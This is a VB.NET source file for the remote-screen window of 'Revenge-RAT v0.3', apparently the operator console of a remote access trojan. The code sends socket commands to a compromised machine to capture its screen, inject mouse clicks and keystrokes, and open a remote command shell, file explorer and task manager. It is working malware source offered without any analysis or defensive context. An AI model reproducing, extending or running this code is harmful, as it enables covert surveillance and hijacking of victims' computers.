Imports Microsoft.VisualBasic.CompilerServices
Imports Revenge_RAT_v0._3.RevengeRAT

Public Class RemoteScreen
    Public F As Main
    Public FolderSavePic As String
    Public sock As Integer
    Public Sz As Size
    Public T As String

    Private Sub HideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem.Click
        If Operators.ConditionalCompareObjectEqual(Me.SH.Tag, "0", False) Then
            Me.SH.Tag = "1"
            Me.CO.Visible = True
            Me.SH.Visible = False
        Else
            Me.SH.Tag = "0"
            Me.SH.Visible = True
            Me.CO.Visible = False
        End If
    End Sub

    Private Sub KE_Click(sender As Object, e As EventArgs) Handles KE.Click
        If Operators.ConditionalCompareObjectEqual(Me.KE.Tag, "0", False) Then
            Me.KE.Tag = "1"
            Me.KE.Image = My.Resources._1472451892_keyboard_add
        Else
            Me.KE.Tag = "0"
            Me.KE.Image = My.Resources._1472451891_keyboard
        End If
        Me.SH.Focus()
    End Sub

    Private Sub M_Click(sender As Object, e As EventArgs) Handles M.Click
        If Operators.ConditionalCompareObjectEqual(Me.M.Tag, "0", False) Then
            Me.M.Tag = "1"
            Me.M.Image = My.Resources._1472450092_mouse_add
        Else
            Me.M.Tag = "0"
            Me.M.Image = My.Resources._1472450093_mouse
        End If
    End Sub

    Private Sub MN_Click(sender As Object, e As EventArgs) Handles MN.Click
        If Operators.ConditionalCompareObjectEqual(Me.MN.Tag, "0", False) Then
            Me.MN.Tag = "1"
            Me.MN.Image = My.Resources._1473000774_FullscreenExit
            Me.FormBorderStyle = FormBorderStyle.None
            Me.WindowState = FormWindowState.Maximized
            Me.ProgressBar1.Visible = False
            Me.TopMost = True
        Else
            Me.MN.Tag = "0"
            Me.MN.Image = My.Resources._1473000728_full_screen
            Me.FormBorderStyle = FormBorderStyle.Sizable
            Me.WindowState = FormWindowState.Normal
            Me.ProgressBar1.Visible = True
            Me.TopMost = False
        End If
    End Sub

    Private Sub OpenATerminalToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenATerminalToolStripMenuItem.Click
        My.Forms.Main.s.Send(Me.sock, "Cmd")
    End Sub

    Private Sub OpenFileExplorerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenFileExplorerToolStripMenuItem.Click
        My.Forms.Main.s.Send(Me.sock, "E")
    End Sub

    Private Sub OpenTaskManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenTaskManagerToolStripMenuItem.Click
        My.Forms.Main.s.Send(Me.sock, "TM")
    End Sub

    Private Sub P1_DoubleClick(sender As Object, e As EventArgs) Handles P1.DoubleClick
        If Operators.ConditionalCompareObjectEqual(Me.M.Tag, "0", False) Then
            If Operators.ConditionalCompareObjectEqual(Me.MN.Tag, "0", False) Then
                Me.MN.Tag = "1"
                Me.MN.Image = My.Resources._1473000774_FullscreenExit
                Me.FormBorderStyle = FormBorderStyle.None
                Me.WindowState = FormWindowState.Maximized
                Me.ProgressBar1.Visible = False
                Me.TopMost = True
            Else
                Me.MN.Tag = "0"
                Me.MN.Image = My.Resources._1473000728_full_screen
                Me.FormBorderStyle = FormBorderStyle.Sizable
                Me.WindowState = FormWindowState.Normal
                Me.ProgressBar1.Visible = True
                Me.TopMost = False
            End If
        End If
    End Sub

    Private Sub P1_MouseDown(sender As Object, e As MouseEventArgs) Handles P1.MouseDown
        If Operators.ConditionalCompareObjectEqual(Me.M.Tag, "1", False) Then
            Dim num As Integer
            Dim point As New Point(CInt(Math.Round(CDbl((e.X * (CDbl(Me.Sz.Width) / CDbl(Me.P1.Width)))))), CInt(Math.Round(CDbl((e.Y * (CDbl(Me.Sz.Height) / CDbl(Me.P1.Height)))))))
            If (e.Button = MouseButtons.Left) Then
                num = 2
            End If
            If (e.Button = MouseButtons.Right) Then
                num = 8
            End If
            Me.F.s.Send(Me.sock, String.Concat(New String() {"#", Me.F.Key, Conversions.ToString(point.X), Me.F.Key, Conversions.ToString(point.Y), Me.F.Key, Conversions.ToString(num)}))
        End If
    End Sub

    Private Sub P1_MouseUp(sender As Object, e As MouseEventArgs) Handles P1.MouseUp
        If Operators.ConditionalCompareObjectEqual(Operators.CompareObjectEqual(Me.M.Tag, "1", False), True, False) Then
            Dim num As Integer
            Dim point As New Point(CInt(Math.Round(CDbl((e.X * (CDbl(Me.Sz.Width) / CDbl(Me.P1.Width)))))), CInt(Math.Round(CDbl((e.Y * (CDbl(Me.Sz.Height) / CDbl(Me.P1.Height)))))))
            If (e.Button = MouseButtons.Left) Then
                num = 4
            End If
            If (e.Button = MouseButtons.Right) Then
                num = &H10
            End If
            Me.F.s.Send(Me.sock, String.Concat(New String() {"#", Me.F.Key, Conversions.ToString(point.X), Me.F.Key, Conversions.ToString(point.Y), Me.F.Key, Conversions.ToString(num)}))
        End If
    End Sub

    Private Sub Q_Scroll(sender As Object, e As EventArgs) Handles Q.Scroll
        My.Forms.Main.s.Send(Me.sock, ("Q" & My.Forms.Main.Key & Conversions.ToString(Me.Q.Value)))
        Me.Label1.Text = (Conversions.ToString(Me.Q.Value) & "%")
    End Sub

    Private Sub RemoteScreen_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        My.Forms.Main.s.Send(Me.sock, "Abort")
    End Sub

    Private Sub RemoteScreen_Load(sender As Object, e As EventArgs) Handles Me.Load
        Dim point2 As Point
        Me.BackColor = Color.Black
        Try
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2.3) - (CDbl(Me.SH.Size.Width) / 2.3))))), 0)
            Me.SH.Location = point2
        Catch exception1 As Exception
        End Try
        Try
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2.3) - (CDbl(Me.CO.Size.Width) / 2.3))))), 0)
            Me.CO.Location = point2
        Catch exception2 As Exception
        End Try
        Me.P1.Image = New Bitmap(Me.Sz.Width, Me.Sz.Height)
        If My.Forms.Main.SA Then
            Me.D.SelectedIndex = 0
            Me.Q.Value = Conversions.ToInteger(SocketServer.GetIndex(My.Forms.Main.DV))
            Me.SC()
        End If
        Me.Label1.Text = (Conversions.ToString(Me.Q.Value) & "%")
    End Sub

    Private Sub RemoteScreen_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        Dim point2 As Point
        Try
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2.3) - (CDbl(Me.CO.Size.Width) / 2.3))))), 0)
            Me.CO.Location = point2
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
        Try
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2.3) - (CDbl(Me.SH.Size.Width) / 2.3))))), 0)
            Me.SH.Location = point2
        Catch exception2 As Exception
            ProjectData.SetProjectError(exception2)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub SA_Click(sender As Object, e As EventArgs) Handles SA.Click
        If Operators.ConditionalCompareObjectEqual(Me.ST.Tag, "1", False) Then
            If Operators.ConditionalCompareObjectEqual(Me.SA.Tag, "0", False) Then
                Me.SA.Tag = "1"
                Me.SA.Image = My.Resources._1472453350_save_add2
                Process.Start(Me.FolderSavePic)
            Else
                Me.SA.Tag = "0"
                Me.SA.Image = My.Resources._1472453348_save
            End If
        End If
    End Sub

    Private Sub SH_Click(sender As Object, e As EventArgs) Handles SH.Click
        If Operators.ConditionalCompareObjectEqual(Me.SH.Tag, "0", False) Then
            Me.SH.Tag = "1"
            Me.CO.Visible = True
        Else
            Me.SH.Tag = "0"
            Me.CO.Visible = False
        End If
    End Sub

    Private Sub SH_KeyDown(sender As Object, e As KeyEventArgs) Handles SH.KeyDown
        My.Forms.Main.s.Send(Me.sock, ("KeyBoardType" & My.Forms.Main.Key & Conversions.ToString(CInt(e.KeyCode))))
    End Sub

    Private Sub ST_Click(sender As Object, e As EventArgs) Handles ST.Click
        Me.SC()
    End Sub

    Public Function SC() As Object
        Dim obj2 As Object
        If (Me.D.Text.Length = 0) Then
            MessageBox.Show("You must choose a monitor!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            Return obj2
        End If
        If Operators.ConditionalCompareObjectEqual(Me.ST.Tag, "0", False) Then
            Me.ST.Tag = "1"
            My.Forms.Main.s.Send(Me.sock, String.Concat(New String() {"Start Capture", My.Forms.Main.Key, Conversions.ToString(Me.D.SelectedIndex), My.Forms.Main.Key, Conversions.ToString(Me.Q.Value)}))
            Me.D.Enabled = False
            Me.ST.Text = "Stop"
            Return obj2
        End If
        Me.ST.Text = "Start"
        My.Forms.Main.s.Send(Me.sock, "Stop")
        Me.D.Enabled = True
        Me.ProgressBar1.Value = 0
        Me.ST.Tag = "0"
        Me.M.Tag = "0"
        Me.M.Image = My.Resources._1472450093_mouse
        Me.KE.Tag = "0"
        Me.KE.Image = My.Resources._1472451891_keyboard
        Me.SA.Tag = "0"
        Me.SA.Image = My.Resources._1472453348_save
        Return obj2
    End Function

    Private Sub DL_Click(sender As Object, e As EventArgs) Handles DL.Click
        Me.FE.Show(Me.DL, 0, Me.DL.Height)
    End Sub
End Class